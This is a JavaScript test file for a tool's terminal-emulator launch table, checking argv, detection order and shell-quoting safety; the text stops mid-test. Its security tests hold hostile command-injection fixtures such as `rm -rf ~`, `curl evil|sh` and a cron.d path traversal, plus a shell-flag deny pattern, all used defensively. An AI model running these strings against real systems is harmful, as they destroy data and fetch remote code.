/**
 * WP-04 — the terminal emulator table.
 *
 * Nothing here spawns a process, opens an application or writes into a real
 * temp directory. It cannot: this package was written on Windows, and NO
 * launch form in it for macOS or Linux has been run on a real desktop
 * (`docs/DEVIATIONS.md` §9, §91). So the proof available is the one these
 * tests give — that for every (platform, emulator) pair the argv array is
 * exactly the documented invocation, byte for byte, and that no user-supplied
 * value can become part of a string a shell would parse.
 *
 * The pair coverage is enforced, not merely written: `EXPECTED` below is
 * compared against the set of pairs the table actually offers, so adding an
 * emulator without an argv assertion fails this file rather than shipping
 * unasserted.
 *
 * The `SECURITY:` tests at the bottom are the ones that matter most. A session
 * id arrives from a request body, and `docs/DEVIATIONS.md` §28 is what happens
 * when data from a request reaches something that executes it.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import {
  ITERM_SCRIPT,
  LINUX_TERMINALS,
  MAC_TERMINALS,
  TERMINAL_AUTO,
  WINDOWS_TERMINALS,
  buildLaunch,
  detectTerminal,
  detectTerminals,
  describeTerminal,
  findTerminal,
  launchTerminal,
  launcherFileName,
  launcherScript,
  runningInside,
  shQuote,
  terminalFromEnvVar,
  terminalIds,
  terminalsFor,
  writeLauncherScript,
} from '../../src/core/terminals.mjs';
import * as shim from '../../src/adapters/claude-code/terminals.mjs';
import * as moved from '../../src/core/terminals.mjs';

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const ID = 'abc-123';
const COMMAND = ['claude', '--resume', ID];
const SCRIPT = '/var/folders/xx/T/deckhq-resume-abc-123-1700000000000.command';
const MAC_CWD = '/Users/ada/work/deckhq';
const LINUX_CWD = '/home/ada/work/deckhq';
const WIN_CWD = 'C:\\Dk\\deckhq';

/** cwd per platform, so the expectations read like the real invocation. */
const CWD = { darwin: MAC_CWD, linux: LINUX_CWD, win32: WIN_CWD };

/**
 * The whole contract, as data: one entry per (platform, emulator, launch
 * form). Keyed `platform/id/via`.
 *
 * Each value is the exact argv the emulator's own documentation calls for.
 * `bin` is the CLI on `PATH`; `app` is macOS `open`, where everything after
 * `--args` reaches the application unparsed.
 */
const EXPECTED = {
  // ------------------------------------------------------------------ macOS
  'darwin/ghostty/bin': {
    cmd: 'ghostty',
    args: [`--working-directory=${MAC_CWD}`, '-e', 'claude', '--resume', ID],
  },
  'darwin/ghostty/app': {
    cmd: 'open',
    args: [
      '-na',
      'Ghostty',
      '--args',
      `--working-directory=${MAC_CWD}`,
      '-e',
      'claude',
      '--resume',
      ID,
    ],
  },
  'darwin/iterm2/app': { cmd: 'osascript', args: ['-e', ITERM_SCRIPT, SCRIPT] },
  'darwin/warp/app': { cmd: 'open', args: ['-a', 'Warp', SCRIPT] },
  'darwin/kitty/bin': {
    cmd: 'kitty',
    args: ['--directory', MAC_CWD, 'claude', '--resume', ID],
  },
  'darwin/kitty/app': {
    cmd: 'open',
    args: ['-na', 'kitty', '--args', '--directory', MAC_CWD, 'claude', '--resume', ID],
  },
  'darwin/wezterm/bin': {
    cmd: 'wezterm',
    args: ['start', '--cwd', MAC_CWD, '--', 'claude', '--resume', ID],
  },
  'darwin/wezterm/app': {
    cmd: 'open',
    args: ['-na', 'WezTerm', '--args', 'start', '--cwd', MAC_CWD, '--', 'claude', '--resume', ID],
  },
  'darwin/terminal-app/app': { cmd: 'open', args: ['-a', 'Terminal', SCRIPT] },

  // ------------------------------------------------------------------ Linux
  'linux/alacritty/bin': {
    cmd: 'alacritty',
    args: ['--working-directory', LINUX_CWD, '-e', 'claude', '--resume', ID],
  },
  'linux/foot/bin': {
    cmd: 'foot',
    args: [`--working-directory=${LINUX_CWD}`, 'claude', '--resume', ID],
  },
  'linux/kitty/bin': {
    cmd: 'kitty',
    args: ['--directory', LINUX_CWD, 'claude', '--resume', ID],
  },
  'linux/wezterm/bin': {
    cmd: 'wezterm',
    args: ['start', '--cwd', LINUX_CWD, '--', 'claude', '--resume', ID],
  },
  'linux/gnome-terminal/bin': {
    cmd: 'gnome-terminal',
    args: [`--working-directory=${LINUX_CWD}`, '--', 'claude', '--resume', ID],
  },
  'linux/konsole/bin': {
    cmd: 'konsole',
    args: ['--workdir', LINUX_CWD, '-e', 'claude', '--resume', ID],
  },
  'linux/xfce4-terminal/bin': {
    cmd: 'xfce4-terminal',
    args: [`--working-directory=${LINUX_CWD}`, '-x', 'claude', '--resume', ID],
  },
  'linux/xterm/bin': { cmd: 'xterm', args: ['-e', 'claude', '--resume', ID] },
  'linux/x-terminal-emulator/bin': {
    cmd: 'x-terminal-emulator',
    args: ['-e', 'claude', '--resume', ID],
  },

  // ---------------------------------------------------------------- Windows
  'linux/../win32': undefined, // (placeholder removed below; see pairsInTable)
  'win32/windows-console/bin': {
    cmd: 'cmd',
    args: ['/c', 'start', '', 'cmd', '/k', 'claude', '--resume', ID],
  },
};
delete EXPECTED['linux/../win32'];

const PLATFORMS = ['darwin', 'linux', 'win32'];

/** Every (platform, emulator, launch form) the table actually offers. */
function pairsInTable() {
  const out = [];
  for (const platform of PLATFORMS) {
    for (const terminal of terminalsFor(platform)) {
      for (const via of ['bin', 'app']) {
        if (terminal.launch[via])
          out.push({ platform, terminal, via, key: `${platform}/${terminal.id}/${via}` });
      }
    }
  }
  return out;
}

/**
 * Recover an argv from a POSIX shell line that `shQuote` produced. Used to
 * prove the wrapper script round-trips the exact values it was given rather
 * than merely "looking escaped".
 * @param {string} line
 * @returns {string[]}
 */
function unquoteShLine(line) {
  /** @type {string[]} */
  const out = [];
  let i = 0;
  while (i < line.length) {
    if (line[i] === ' ') {
      i++;
      continue;
    }
    let cur = '';
    while (i < line.length && line[i] !== ' ') {
      if (line[i] === "'") {
        i++;
        while (i < line.length && line[i] !== "'") cur += line[i++];
        i++;
      } else if (line[i] === '\\') {
        cur += line[i + 1];
        i += 2;
      } else {
        cur += line[i++];
      }
    }
    out.push(cur);
  }
  return out;
}

// ---------------------------------------------------------------------------
// The table itself
// ---------------------------------------------------------------------------

test('macOS prefers exactly the order WP-04 sets', () => {
  assert.deepEqual(
    MAC_TERMINALS.map((t) => t.id),
    ['ghostty', 'iterm2', 'warp', 'kitty', 'wezterm', 'terminal-app'],
  );
});

test('Linux tries exactly WP-04s list, in order, with the Debian alternative last', () => {
  assert.deepEqual(
    LINUX_TERMINALS.map((t) => t.id),
    [
      'alacritty',
      'foot',
      'kitty',
      'wezterm',
      'gnome-terminal',
      'konsole',
      'xfce4-terminal',
      'xterm',
      'x-terminal-emulator',
    ],
  );
});

test('every entry has an id, a label and at least one launch form; ids are unique per platform', () => {
  for (const platform of PLATFORMS) {
    const table = terminalsFor(platform);
    const ids = new Set();
    for (const t of table) {
      assert.match(t.id, /^[a-z][a-z0-9-]*$/, `${platform}: bad id ${t.id}`);
      assert.ok(t.label && typeof t.label === 'string', `${platform}/${t.id}: no label`);
      assert.ok(t.launch.bin || t.launch.app, `${platform}/${t.id}: no launch form`);
      assert.ok(!ids.has(t.id), `${platform}: duplicate id ${t.id}`);
      ids.add(t.id);
    }
  }
});

test('only macOS uses the "app" launch form; every other platform launches a binary', () => {
  for (const platform of ['linux', 'win32']) {
    for (const t of terminalsFor(platform)) {
      assert.equal(t.launch.app, undefined, `${platform}/${t.id} should have no app form`);
    }
  }
});

test('macOS and Windows each have exactly one guaranteed fallback; Linux has none', () => {
  assert.deepEqual(
    MAC_TERMINALS.filter((t) => t.always).map((t) => t.id),
    ['terminal-app'],
  );
  assert.deepEqual(
    WINDOWS_TERMINALS.filter((t) => t.always).map((t) => t.id),
    ['windows-console'],
  );
  assert.deepEqual(
    LINUX_TERMINALS.filter((t) => t.always),
    [],
  );
});

test('the wrapper script is only used where the emulator takes no argv', () => {
  // Exactly the three macOS applications whose only documented interface is a
  // shell line or a file. Anything else growing a script is a regression.
  assert.deepEqual(
    MAC_TERMINALS.filter((t) => t.needsScript).map((t) => t.id),
    ['iterm2', 'warp', 'terminal-app'],
  );
  for (const platform of ['linux', 'win32']) {
    for (const t of terminalsFor(platform)) {
      assert.ok(!t.needsScript, `${platform}/${t.id} should not need a script`);
    }
  }
});

test('terminalIds covers every emulator on every platform, plus auto', () => {
  const ids = terminalIds();
  assert.ok(ids.includes(TERMINAL_AUTO));
  for (const platform of PLATFORMS) {
    for (const t of terminalsFor(platform)) assert.ok(ids.includes(t.id), `missing ${t.id}`);
  }
  assert.equal(new Set(ids).size, ids.length, 'ids must be unique');
});

test('findTerminal is per platform: a macOS id does not resolve on Linux', () => {
  assert.equal(findTerminal('darwin', 'iterm2')?.label, 'iTerm2');
  assert.equal(findTerminal('linux', 'iterm2'), null);
  assert.equal(findTerminal('linux', 'foot')?.label, 'foot');
  assert.equal(findTerminal('darwin', 'foot'), null);
  // kitty and WezTerm are on both, and each platform's entry is its own.
  assert.notEqual(findTerminal('darwin', 'kitty'), findTerminal('linux', 'kitty'));
});

// ---------------------------------------------------------------------------
// The argv, pair by pair
// ---------------------------------------------------------------------------

test('every (platform, emulator, launch form) pair has an asserted argv, and vice versa', () => {
  const inTable = pairsInTable()
    .map((p) => p.key)
    .sort();
  assert.deepEqual(Object.keys(EXPECTED).sort(), inTable);
});

for (const { platform, terminal, via, key } of pairsInTable()) {
  test(`argv for ${key}`, () => {
    const launch = buildLaunch(terminal, {
      command: COMMAND,
      cwd: CWD[platform],
      scriptPath: SCRIPT,
      via,
    });
    assert.deepEqual(launch, EXPECTED[key]);
  });
}

test('buildLaunch picks the binary form by default, and the app form when that is all there is', () => {
  const ghostty = findTerminal('darwin', 'ghostty');
  assert.equal(buildLaunch(ghostty, { command: COMMAND, cwd: MAC_CWD }).cmd, 'ghostty');
  const warp = findTerminal('darwin', 'warp');
  assert.equal(
    buildLaunch(warp, { command: COMMAND, cwd: MAC_CWD, scriptPath: SCRIPT }).cmd,
    'open',
  );
});

test('buildLaunch refuses to invent a wrapper script path it was not given', () => {
  for (const id of ['iterm2', 'warp', 'terminal-app']) {
    assert.throws(
      () => buildLaunch(findTerminal('darwin', id), { command: COMMAND, cwd: MAC_CWD }),
      /wrapper script/,
      id,
    );
  }
});

test('buildLaunch refuses a launch form the emulator does not have', () => {
  assert.throws(
    () =>
      buildLaunch(findTerminal('darwin', 'warp'), { command: COMMAND, cwd: MAC_CWD, via: 'bin' }),
    /no "bin" launch form/,
  );
});

test('the old adapter path re-exports the moved module, binding for binding', () => {
  // The module moved to `src/core/` when the Codex adapter became its second
  // caller (docs/DEVIATIONS.md §94). `src/cli/doctor.mjs` and
  // `src/http/routes/settings.mjs` still import it by the old path, so the
  // re-export has to carry everything, not just what those two happen to use.
  assert.deepEqual(Object.keys(shim).sort(), Object.keys(moved).sort());
  for (const key of Object.keys(moved)) {
    assert.equal(shim[key], moved[key], `${key} is not the same binding`);
  }
});

test('no launch form anywhere hands a command to a shell', () => {
  // The failure this catches by name: `sh -c "<line>"`, `bash -lc "<line>"`,
  // and the `-c`/`-lc` forms an emulator's own docs sometimes suggest. The
  // Codex adapter did exactly this until §94; `codex-terminal.test.mjs` now
  // runs this same assertion over its command.
  for (const { terminal, via, platform, key } of pairsInTable()) {
    const { cmd, args } = buildLaunch(terminal, {
      command: COMMAND,
      cwd: CWD[platform],
      scriptPath: SCRIPT,
      via,
    });
    assert.ok(!/^(sh|bash|zsh|dash|fish|pwsh|powershell)(\.exe)?$/.test(cmd), `${key}: ${cmd}`);
    for (const a of args) {
      assert.ok(!/^-{1,2}(c|lc|lic|command)$/.test(a), `${key}: shell flag ${a}`);
    }
  }
});

// ---------------------------------------------------------------------------
// The wrapper script
// ---------------------------------------------------------------------------

test('shQuote produces a value sh reads back unchanged, quote included', () => {
  assert.equal(shQuote('plain'), `'plain'`);
  assert.equal(shQuote(`it's`), `'it'\\''s'`);
  assert.deepEqual(unquoteShLine(shQuote(`it's`)), [`it's`]);
});

test('the wrapper script quotes every value and refuses to run in the wrong directory', () => {
  const script = launcherScript(COMMAND, MAC_CWD);
  assert.match(script, /^#!\/bin\/sh\n/);
  assert.match(script, /\ncd '\/Users\/ada\/work\/deckhq' \|\| exit 1\n/);
  assert.match(script, /\nexec 'claude' '--resume' 'abc-123'\n$/);
});

test('the wrapper script round-trips the exact argv it was given', () => {
  const command = ['claude', '--resume', `id'with"quotes and $spaces`, '-p', 'ship it; now'];
  const cwd = `/Users/ada/it's a "project"/x`;
  const script = launcherScript(command, cwd);
  const [cdLine, execLine] = script
    .split('\n')
    .filter((l) => l.startsWith('cd ') || l.startsWith('exec '));
  assert.deepEqual(unquoteShLine(cdLine.slice('cd '.length).replace(/ \|\| exit 1$/, '')), [cwd]);
  assert.deepEqual(unquoteShLine(execLine.slice('exec '.length)), command);
});

test('SECURITY: the wrapper script filename cannot escape the directory it is written to', () => {
  const name = launcherFileName('resume', '../../../etc/cron.d/pwn', 1);
  assert.equal(name, 'deckhq-resume-.._.._.._etc_cron.d_pwn-1.command');
  assert.ok(!name.includes('/'), name);
  assert.ok(!name.includes('\\'), name);
  assert.equal(path.basename(name), name);
  // And a filename cannot be turned into shell syntax either.
  const nasty = launcherFileName('resume', '$(id);`id`&& rm -rf ~', 1);
  assert.match(nasty, /^deckhq-resume-[A-Za-z0-9._-]+-1\.command$/);
  // An id made entirely of stripped characters still yields a usable name.
  assert.equal(launcherFileName('new', '', 7), 'deckhq-new-session-7.command');
});

test('writeLauncherScript writes an executable file whose only user data is quoted', async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'deckhq-terminals-'));
  try {
    const file = await writeLauncherScript({
      command: COMMAND,
      cwd: MAC_CWD,
      prefix: 'resume',
      sessionId: ID,
      dir,
      now: 42,
    });
    assert.equal(path.dirname(file), dir);
    assert.equal(path.basename(file), 'deckhq-resume-abc-123-42.command');
    const text = await fsp.readFile(file, 'utf8');
    assert.equal(text, launcherScript(COMMAND, MAC_CWD));
  } finally {
    await fsp.rm(dir, { recursive: true, force: true });
  }
});

test('the iTerm2 AppleScript takes its target as an argument and quotes it itself', () => {
  // The whole point: nothing user-supplied is interpolated into this source.
  assert.match(ITERM_SCRIPT, /on run argv/);
  assert.match(ITERM_SCRIPT, /quoted form of \(item 1 of argv\)/);
  assert.ok(!ITERM_SCRIPT.includes(ID));
  assert.ok(!ITERM_SCRIPT.includes(MAC_CWD));
  // And the argv it is given is the script path, in its own element.
  const launch = buildLaunch(findTerminal('darwin', 'iterm2'), {
    command: COMMAND,
    cwd: MAC_CWD,
    scriptPath: SCRIPT,
  });
  assert.deepEqual(launch.args, ['-e', ITERM_SCRIPT, SCRIPT]);
});

// ---------------------------------------------------------------------------
// SECURITY: a hostile session id
// ---------------------------------------------------------------------------

const HOSTILE = `x'; rm -rf ~ #$(id)\`id\` && curl evil|sh`;

test('SECURITY: a session id full of shell metacharacters never becomes shell syntax, on any platform', () => {
  const command = ['claude', '--resume', HOSTILE];
  for (const { platform, terminal, via, key } of pairsInTable()) {
    const { cmd, args } = buildLaunch(terminal, {
      command,
      cwd: CWD[platform],
      scriptPath: SCRIPT,
      via,
    });
    assert.ok(!cmd.includes(HOSTILE), `${key}: the id reached the executable name`);

    if (terminal.needsScript) {
      // The id is in the wrapper file, quoted. It must not appear in the argv
      // at all — the only thing handed over is the generated path.
      for (const a of args) {
        assert.ok(!a.includes(HOSTILE), `${key}: the id reached an argv element`);
      }
      continue;
    }

    // Everywhere else the id travels as one argv element and nothing else.
    const carriers = args.filter((a) => a.includes(HOSTILE));
    assert.equal(carriers.length, 1, `${key}: expected exactly one carrier`);
    assert.equal(carriers[0], HOSTILE, `${key}: the id was concatenated with something`);
  }
});

test('SECURITY: a hostile id inside the wrapper script survives sh as one word', () => {
  const command = ['claude', '--resume', HOSTILE];
  const script = launcherScript(command, MAC_CWD);
  const execLine = script.split('\n').find((l) => l.startsWith('exec '));
  // Read back through the same grammar sh uses: exactly three words, the
  // third being the id verbatim. No command substitution, no `&&`, no
  // comment, no pipeline — they are all inside one quoted word.
  assert.deepEqual(unquoteShLine(execLine.slice('exec '.length)), command);

  // And the line is not merely parseable — it matches the grammar of nothing
  // but single-quoted words separated by single spaces. Every `;`, `$(`,
  // backtick, `&&`, `|` and `#` in the id is therefore inside a quoted word by
  // construction: there is nowhere else in that grammar for a character to be.
  const WORD = String.raw`'(?:[^']|'\\'')*'`;
  assert.match(execLine.slice('exec '.length), new RegExp(`^${WORD}(?: ${WORD})*$`));
  assert.match(HOSTILE, /[;$`&|#']/, 'the fixture must actually be hostile');
});

test('SECURITY: a hostile working directory is quoted the same way', () => {
  const cwd = `/tmp/$(id) && rm -rf ~/'x'`;
  const script = launcherScript(COMMAND, cwd);
  const cdLine = script.split('\n').find((l) => l.startsWith('cd '));
  assert.deepEqual(unquoteShLine(cdLine.slice('cd '.length).replace(/ \|\| exit 1$/, '')), [cwd]);
});

test('SECURITY: a first prompt is one argv element too, however it is written', () => {
  const prompt = 'refactor; rm -rf / # and `whoami`';
  const launch = buildLaunch(findTerminal('linux', 'gnome-terminal'), {
    command: ['claude', prompt],
    cwd: LINUX_CWD,
  });
  assert.deepEqual(launch.args, [`--working-directory=${LINUX_CWD}`, '--', 'claude', prompt]);
});

// ---------------------------------------------------------------------------
// Detection
// ---------------------------------------------------------------------------

/**
 * Detection against a described machine rather than this one. `installed`
 * lists emulator ids; everything else is absent. This is what lets a Windows
 * test run describe a Mac with Ghostty and iTerm2 on it.
 */
function detectWith(opts) {
  const installed = new Set(opts.installed || []);
  const table = terminalsFor(opts.platform);
  const idsFor = (key) =>
    new Set(table.filter((t) => installed.has(t.id) && t[key]).map((t) => t[key]));
  const bins = idsFor('bin');
  const apps = idsFor('app');
  return detectTerminals({
    platform: opts.platform,
    env: opts.env || {},
    pin: opts.pin,
    probes: { bin: async (n) => bins.has(n), app: async (n) => apps.has(n) },
  });
}

test('runningInside reads $TERM_PROGRAM case-insensitively', () => {
  const ghostty = findTerminal('darwin', 'ghostty');
  assert.equal(runningInside(ghostty, { TERM_PROGRAM: 'ghostty' }), true);
  assert.equal(runningInside(ghostty, { TERM_PROGRAM: 'Ghostty' }), true);
  assert.equal(runningInside(ghostty, { TERM_PROGRAM: 'WarpTerminal' }), false);
  assert.equal(
    runningInside(findTerminal('darwin', 'warp'), { TERM_PROGRAM: 'WarpTerminal' }),
    true,
  );
  assert.equal(
    runningInside(findTerminal('darwin', 'iterm2'), { TERM_PROGRAM: 'iTerm.app' }),
    true,
  );
  assert.equal(
    runningInside(findTerminal('darwin', 'terminal-app'), { TERM_PROGRAM: 'Apple_Terminal' }),
    true,
  );
});

test('runningInside falls back to the variables an emulator exports when it sets no $TERM_PROGRAM', () => {
  // kitty, foot, Konsole and GNOME Terminal are the cases this exists for.
  assert.equal(runningInside(findTerminal('linux', 'kitty'), { KITTY_WINDOW_ID: '1' }), true);
  assert.equal(runningInside(findTerminal('linux', 'foot'), { FOOT_PID: '900' }), true);
  assert.equal(
    runningInside(findTerminal('linux', 'konsole'), { KONSOLE_VERSION: '221201' }),
    true,
  );
  assert.equal(
    runningInside(findTerminal('linux', 'gnome-terminal'), { GNOME_TERMINAL_SERVICE: ':1.90' }),
    true,
  );
  assert.equal(runningInside(findTerminal('linux', 'kitty'), {}), false);
  // An empty value is not a signal.
  assert.equal(runningInside(findTerminal('linux', 'kitty'), { KITTY_WINDOW_ID: '' }), false);
});

test('the emulator DeckHQ is running inside wins over the table order', async () => {
  // Ghostty is first in the table AND installed. Being inside WezTerm still
  // puts WezTerm first: the emulator the user is demonstrably sitting in
  // outranks a preference order written months ago.
  const found = await detectWith({
    platform: 'darwin',
    installed: ['ghostty', 'wezterm'],
    env: { TERM_PROGRAM: 'WezTerm' },
  });
  assert.equal(found[0].terminal.id, 'wezterm');
  assert.equal(found[0].reason, 'env');
  assert.equal(found[1].terminal.id, 'ghostty');
  assert.equal(found[1].reason, 'installed');
});

test('$TERM_PROGRAM is evidence the emulator is here, even when no probe finds it', async () => {
  // A Mac whose emulator was never symlinked onto PATH and which
  // LaunchServices does not have registered where we looked. We are provably
  // inside it, so it is used -- through `open`, which needs no CLI.
  const found = await detectWith({ platform: 'darwin', env: { TERM_PROGRAM: 'WezTerm' } });
  assert.equal(found[0].terminal.id, 'wezterm');
  assert.equal(found[0].present, true);
  assert.equal(found[0].via, 'app');
});

test('macOS always ends at Terminal.app, and never with nothing', async () => {
  const found = await detectWith({ platform: 'darwin', installed: [] });
  assert.equal(found.at(-1).terminal.id, 'terminal-app');
  assert.equal(found.at(-1).reason, 'fallback');
  assert.equal(found.at(-1).present, true);
  const one = await detectTerminal({
    platform: 'darwin',
    env: {},
    probes: { bin: async () => false, app: async () => false },
  });
  assert.ok(one, 'macOS must always resolve to something');
});

test('what is installed is offered in the tables own preference order', async () => {
  const found = await detectWith({
    platform: 'darwin',
    installed: ['terminal-app', 'wezterm', 'kitty', 'ghostty'],
    env: {},
  });
  assert.deepEqual(
    found.map((c) => c.terminal.id),
    ['ghostty', 'kitty', 'wezterm', 'terminal-app'],
  );
  assert.deepEqual(
    found.map((c) => c.reason),
    ['installed', 'installed', 'installed', 'fallback'],
  );
});

test('a CLI on PATH is preferred to going through open', async () => {
  const found = await detectWith({ platform: 'darwin', installed: ['kitty'], env: {} });
  assert.equal(found[0].terminal.id, 'kitty');
  assert.equal(found[0].via, 'bin');
});

test('$TERMINAL is honoured before anything detected, and resolves to the table entry when it names one', async () => {
  const found = await detectWith({ platform: 'linux', env: { TERMINAL: 'konsole' } });
  assert.equal(found[0].terminal.id, 'konsole');
  assert.equal(found[0].reason, 'TERMINAL');
});

test('$TERMINAL may be an absolute path and still resolve to the right entry', async () => {
  const found = await detectWith({ platform: 'linux', env: { TERMINAL: '/usr/bin/alacritty' } });
  assert.equal(found[0].terminal.id, 'alacritty');
  assert.equal(found[0].reason, 'TERMINAL');
});

test('$TERMINAL beats $TERM_PROGRAM', async () => {
  const found = await detectWith({
    platform: 'linux',
    env: { TERMINAL: 'xterm', KITTY_WINDOW_ID: '1' },
  });
  assert.equal(found[0].terminal.id, 'xterm');
  assert.equal(found[0].reason, 'TERMINAL');
  // kitty is still a candidate, just not the first one.
  assert.ok(found.some((c) => c.terminal.id === 'kitty' && c.reason === 'env'));
});

test('an unknown $TERMINAL is used anyway, with the -e convention', async () => {
  const found = await detectWith({ platform: 'linux', env: { TERMINAL: 'st' } });
  assert.equal(found[0].terminal.id, 'terminal-env');
  assert.equal(found[0].terminal.label, 'st');
  assert.deepEqual(buildLaunch(found[0].terminal, { command: COMMAND, cwd: LINUX_CWD }), {
    cmd: 'st',
    args: ['-e', 'claude', '--resume', ID],
  });
});

test('terminalFromEnvVar labels an absolute path by its basename but launches the path', () => {
  const t = terminalFromEnvVar('/opt/weird/bin/myterm');
  assert.equal(t.label, 'myterm');
  assert.equal(buildLaunch(t, { command: COMMAND, cwd: LINUX_CWD }).cmd, '/opt/weird/bin/myterm');
});

test('$TERMINAL is ignored on Windows, which has one console and no such convention', async () => {
  const found = await detectWith({ platform: 'win32', env: { TERMINAL: 'xterm' } });
  assert.equal(found.length, 1);
  assert.equal(found[0].terminal.id, 'windows-console');
  assert.equal(found[0].reason, 'fallback');
});

test('a blank $TERMINAL is not a preference', async () => {
  const found = await detectWith({ platform: 'linux', env: { TERMINAL: '   ' } });
  assert.equal(found.length, 0, 'nothing is installed in this stub, so nothing is found');
});

test('a Linux desktop with no known emulator resolves to nothing, rather than guessing', async () => {
  assert.equal(
    await detectTerminal({
      platform: 'linux',
      env: {},
      probes: { bin: async () => false, app: async () => false },
    }),
    null,
  );
});

// ------------------------------------------------------------------- the pin

test('the pinned setting outranks $TERMINAL and $TERM_PROGRAM both', async () => {
  const found = await detectWith({
    platform: 'linux',
    pin: 'foot',
    installed: ['foot', 'xterm', 'wezterm'],
    env: { TERMINAL: 'xterm', TERM_PROGRAM: 'WezTerm' },
  });
  assert.equal(found[0].terminal.id, 'foot');
  assert.equal(found[0].reason, 'pinned');
  // Both of the things it outranked are still behind it.
  assert.deepEqual(
    found.map((c) => c.terminal.id),
    ['foot', 'xterm', 'wezterm'],
  );
});

test('a pin is honoured on macOS over the emulator DeckHQ is running inside', async () => {
  const found = await detectWith({
    platform: 'darwin',
    pin: 'iterm2',
    installed: ['iterm2', 'ghostty'],
    env: { TERM_PROGRAM: 'ghostty' },
  });
  assert.equal(found[0].terminal.id, 'iterm2');
  assert.equal(found[0].reason, 'pinned');
  // Ghostty is still a candidate behind it, so the pin costs nothing if it
  // turns out not to open.
  assert.ok(found.some((c) => c.terminal.id === 'ghostty' && c.reason === 'env'));
});

test('a pin this machine no longer has gives way to one it demonstrably does', async () => {
  // The pin stays in the list -- a silently ignored setting is worse than one
  // that fails with a name -- but it goes behind everything actually found.
  const found = await detectWith({
    platform: 'darwin',
    pin: 'iterm2',
    installed: ['ghostty'],
    env: { TERM_PROGRAM: 'ghostty' },
  });
  assert.equal(found[0].terminal.id, 'ghostty');
  assert.equal(found.at(-1).terminal.id, 'iterm2');
  assert.equal(found.at(-1).reason, 'pinned');
  assert.equal(found.at(-1).present, false);
});

test('"auto" is not a pin', async () => {
  const found = await detectWith({
    platform: 'darwin',
    pin: TERMINAL_AUTO,
    env: { TERM_PROGRAM: 'ghostty' },
  });
  assert.equal(found[0].terminal.id, 'ghostty');
  assert.equal(found[0].reason, 'env');
});

test('a pin naming another platform s emulator is ignored, not obeyed', async () => {
  const found = await detectWith({ platform: 'linux', pin: 'terminal-app', env: {} });
  assert.ok(!found.some((c) => c.reason === 'pinned'));
});

test('a pin for something this machine does not have is reported, and does not cost the feature', async () => {
  // `kitty` cannot be probed in this stub, so it is "pinned but absent". It is
  // still listed — silently ignoring a pin is worse than failing with a name —
  // but Terminal.app, which is genuinely present, is tried first.
  const found = await detectWith({ platform: 'darwin', pin: 'kitty', env: {} });
  const pinned = found.find((c) => c.reason === 'pinned');
  assert.equal(pinned.terminal.id, 'kitty');
  assert.equal(pinned.present, false);
  assert.equal(found[0].terminal.id, 'terminal-app');
  assert.equal(found.at(-1).terminal.id, 'kitty');
});

test('describeTerminal returns plain data a JSON report can carry', async () => {
  const row = await describeTerminal({
    platform: 'darwin',
    env: { TERM_PROGRAM: 'ghostty' },
    probes: { bin: async () => false, app: async () => true },
  });
  assert.deepEqual(row, {
    id: 'ghostty',
    label: 'Ghostty',
    reason: 'env',
    present: true,
    pinned: false,
  });
  assert.deepEqual(JSON.parse(JSON.stringify(row)), row);

  const none = await describeTerminal({
    platform: 'linux',
    env: {},
    probes: { bin: async () => false, app: async () => false },
  });
  assert.deepEqual(none, {
    id: null,
    label: null,
    reason: null,
    present: false,
    pinned: false,
  });
});

// ---------------------------------------------------------------------------
// launchTerminal
// ---------------------------------------------------------------------------

/** A launcher with the machine replaced by counters. */
function launcher(opts = {}) {
  const spawns = [];
  const scripts = [];
  return {
    spawns,
    scripts,
    run: (extra = {}) =>
      launchTerminal({
        command: COMMAND,
        cwd: LINUX_CWD,
        sessionId: ID,
        prefix: 'resume',
        platform: 'linux',
        env: {},
        spawn: async (cmd, args, cwd) => {
          spawns.push({ cmd, args, cwd });
          return opts.spawnOk ? opts.spawnOk(cmd) : true;
        },
        writeScript: async (o) => {
          scripts.push(o);
          return SCRIPT;
        },
        ...extra,
      }),
  };
}

test('launchTerminal spawns the first candidate, with the argv the table says and the cwd it was given', async () => {
  const l = launcher();
  const out = await l.run({
    detect: async () => [
      { terminal: findTerminal('linux', 'kitty'), via: 'bin', reason: 'env', present: true },
    ],
  });
  assert.equal(out.id, 'kitty');
  assert.deepEqual(l.spawns, [
    {
      cmd: 'kitty',
      args: ['--directory', LINUX_CWD, 'claude', '--resume', ID],
      cwd: LINUX_CWD,
    },
  ]);
  assert.deepEqual(l.scripts, [], 'kitty needs no wrapper script');
});

test('launchTerminal falls through to the next candidate when one will not spawn', async () => {
  const l = launcher({ spawnOk: (cmd) => cmd === 'xterm' });
  const out = await l.run({
    detect: async () =>
      ['alacritty', 'konsole', 'xterm'].map((id) => ({
        terminal: findTerminal('linux', id),
        via: 'bin',
        reason: 'installed',
        present: true,
      })),
  });
  assert.equal(out.id, 'xterm');
  assert.deepEqual(
    l.spawns.map((s) => s.cmd),
    ['alacritty', 'konsole', 'xterm'],
  );
});

test('launchTerminal writes the wrapper script only for the emulators that need one', async () => {
  const l = launcher();
  const out = await l.run({
    platform: 'darwin',
    cwd: MAC_CWD,
    detect: async () => [
      {
        terminal: findTerminal('darwin', 'terminal-app'),
        via: 'app',
        reason: 'fallback',
        present: true,
      },
    ],
  });
  assert.deepEqual(l.spawns, [{ cmd: 'open', args: ['-a', 'Terminal', SCRIPT], cwd: MAC_CWD }]);
  assert.deepEqual(l.scripts, [
    { command: COMMAND, cwd: MAC_CWD, prefix: 'resume', sessionId: ID },
  ]);
  assert.equal(out.scriptPath, SCRIPT);
});

test('launchTerminal reports what it tried when nothing would open', async () => {
  const l = launcher({ spawnOk: () => false });
  await assert.rejects(
    () =>
      l.run({
        detect: async () =>
          ['alacritty', 'xterm'].map((id) => ({
            terminal: findTerminal('linux', id),
            via: 'bin',
            reason: 'installed',
            present: true,
          })),
      }),
    /Tried: Alacritty, xterm\./,
  );
});

test('launchTerminal says how to fix a machine where it found no emulator at all', async () => {
  const l = launcher();
  await assert.rejects(
    () => l.run({ detect: async () => [] }),
    (err) => {
      assert.match(err.message, /No supported terminal emulator/);
      assert.match(err.message, /\$TERMINAL/);
      // The message names the ids the `terminal` setting accepts here, so the
      // fix does not require reading the source.
      assert.match(err.message, /alacritty, foot, kitty/);
      return true;
    },
  );
  assert.deepEqual(l.spawns, []);
});

test('launchTerminal skips an emulator whose wrapper script could not be written', async () => {
  const spawns = [];
  const out = await launchTerminal({
    command: COMMAND,
    cwd: MAC_CWD,
    platform: 'darwin',
    env: {},
    spawn: async (cmd, args) => {
